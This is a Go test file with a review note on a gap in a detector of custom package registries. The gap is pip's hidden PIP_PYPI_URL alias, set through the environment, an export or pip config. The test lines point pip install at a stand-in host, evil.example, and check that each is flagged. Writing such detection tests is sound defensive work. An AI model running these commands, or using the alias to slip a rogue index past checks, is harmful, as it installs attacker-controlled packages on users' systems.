package installread

import (
	"slices"
	"testing"
)

// Independent re-review of READER-VAR-OPT-1 round 4 (cf45789 on bd17ee4), 2026-11-15. Placeholders only.

// T1 (P2, already on production; the environment form of S1). pip reads every option from PIP_<NAME> and from its
// config files by the option's long name, hidden aliases included: PIP_PYPI_URL=http://127.0.0.1:9/simple pip
// install … printed "Looking in indexes: http://127.0.0.1:9/simple" (pip 26.2.2). env.go's lvSource lists
// PIP_INDEX_URL, PIP_EXTRA_INDEX_URL and PIP_FIND_LINKS only, so the alias set through the line's own environment,
// export, or pip config set is silent.
func TestReviewR4PipPypiURLEnvironment(t *testing.T) {
	for _, line := range []string{
		"PIP_PYPI_URL=https://evil.example/simple pip install zz-var-pkg",
		"export PIP_PYPI_URL=https://evil.example/simple && pip install zz-var-pkg",
		"pip config set global.pypi-url https://evil.example/simple && pip install zz-var-pkg",
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, "custom_registry") {
			t.Errorf("%q: codes %v, want custom_registry", line, codes)
		}
	}
}
